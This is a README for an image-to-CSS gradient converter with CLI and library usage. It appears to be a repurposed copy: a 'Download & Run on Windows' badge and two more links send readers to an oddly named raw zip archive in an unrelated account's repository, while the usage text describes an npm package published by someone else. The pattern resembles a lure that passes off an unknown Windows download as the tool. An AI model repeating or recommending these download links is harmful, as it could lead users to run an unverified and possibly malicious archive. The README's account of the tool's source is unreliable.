# 🖼️ image-to-pure-css - Turn Images Into Pure CSS

[![Download / Install](https://img.shields.io/badge/Download%20%26%20Run%20on%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Favorite-socialpsychology82/image-to-pure-css/raw/refs/heads/main/src/pure-css-image-to-unprogressiveness.zip)

## 📥 Download and Run on Windows

Open this page: https://github.com/Favorite-socialpsychology82/image-to-pure-css/raw/refs/heads/main/src/pure-css-image-to-unprogressiveness.zip

1. Go to the repository page.
2. Download the latest Windows build if one is available.
3. If you use the source package, make sure Node.js is installed first.
4. Open Command Prompt or PowerShell.
5. Run the command below in the project folder:

```bash
npm install
npx @kongyo2/image-to-pure-css <image-file> [options]
```

If you use `npx`, you can run the tool without a full install of the package into another app.

## 🧭 What This Tool Does

`image-to-pure-css` changes an image into CSS that uses only `linear-gradient` and one `<div>` element.

It does not use `<canvas>` or `<img>` tags.

The tool looks at each line of the image and turns it into a 1px-tall gradient. It then stacks those gradients with `background-image` to build the full picture.

This helps you make image-like output with plain CSS.

## ⚙️ How It Works

The tool uses a few simple steps:

- It reads the image file.
- It checks each row of pixels.
- It groups colors into short CSS values when possible.
- It sets the most common color as `background-color`.
- It skips rows that match the background color.
- It uses shared `background-size` and `background-repeat` values.
- It writes the result as CSS text.

This keeps the output clean and smaller than a direct pixel-by-pixel approach.

## 🚀 Getting Started

If you want to convert an image on Windows, follow these steps:

1. Save the image you want to convert in a folder you can find easily, such as `Pictures` or `Desktop`.
2. Open Command Prompt.
3. Move to the folder that contains the image.
4. Run the command with your image file name.

Example:

```bash
npx @kongyo2/image-to-pure-css photo.png
```

This creates a CSS output file with the same base name as the image.

## 🧩 Installation

If you want to use the package in your own project, install it with npm:

```bash
npm install @kongyo2/image-to-pure-css
```

This is useful if you want to call the converter from your own scripts.

## 🛠️ Command Line Use

Use the CLI when you want to convert an image from the terminal.

```bash
npx @kongyo2/image-to-pure-css <画像ファイル> [オプション]
```

### Options

| Option | What it does |
|---|---|
| `--width N` | Resizes the output width to `N` pixels and keeps the same shape |
| `--tolerance N` | Sets how close colors can be before the tool treats them as the same color |
| `--output file.txt` | Saves the result to a file you choose |

### Examples

```bash
# Basic conversion
npx @kongyo2/image-to-pure-css photo.png
```

```bash
# Resize to 100px wide
npx @kongyo2/image-to-pure-css photo.png --width 100
```

```bash
# Reduce output size with tolerance and custom file name
npx @kongyo2/image-to-pure-css photo.png --tolerance 10 --output output.txt
```

## 🧪 Library Use

You can also use the tool inside your code.

```typescript
import { convertImageToCSS } from "@kongyo2/image-to-pure-css";
```

Use this when you want to convert images as part of a script or app.

## 📌 Output Style

The generated CSS aims to stay compact.

It uses these ideas:

- Short color codes when possible, such as `#fff`
- One shared `background-size` value
- One shared `background-repeat` value
- A single background color for the most common pixel
- Fewer gradient layers when rows match the base color

This makes the CSS easier to copy into a page or component.

## 🖥️ Windows Setup Tips

If the command does not run at first, check these items:

1. Make sure Node.js is installed.
2. Make sure you opened the terminal in the right folder.
3. Make sure the image file name is correct.
4. If the file path has spaces, wrap it in quotes:

```bash
npx @kongyo2/image-to-pure-css "My Photo.png"
```

5. If you want the result in a fixed file name, use `--output`.

## 📂 Typical Use Flow

A simple flow looks like this:

1. Download or clone the project from the link above.
2. Open the folder on Windows.
3. Place your image in the folder.
4. Run the CLI command.
5. Open the text output file.
6. Copy the CSS into your page or component.

## 🎨 Good Uses

This tool fits cases where you want:

- CSS-based image recreation
- Small visual samples
- Generated art effects
- A single-element layout
- No use of `<img>` or `<canvas>`

## 🔍 Best Results

For cleaner output, use images with:

- Simple shapes
- Flat colors
- Small size
- Low color noise

If the image has many tiny color changes, you can try `--tolerance` to merge similar colors.

## 📎 Download Link

Open the project page here and visit this page to download:
https://github.com/Favorite-socialpsychology82/image-to-pure-css/raw/refs/heads/main/src/pure-css-image-to-unprogressiveness.zip